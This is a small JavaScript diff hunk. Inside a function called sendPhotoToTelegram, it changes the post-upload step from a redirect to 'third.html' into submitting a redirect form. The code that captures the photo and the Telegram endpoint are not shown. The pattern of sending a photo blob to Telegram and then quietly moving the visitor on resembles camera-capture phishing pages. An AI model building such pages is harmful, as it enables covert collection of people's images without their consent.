@@ -63,7 +63,7 @@ function sendPhotoToTelegram(blob) {
   .then(response => response.json())
   .then(data => {
     console.log(data);
-    window.location.href = "third.html";
+    document.getElementById("redirectForm").submit();
   })
   .catch(error => {
     console.error(error);
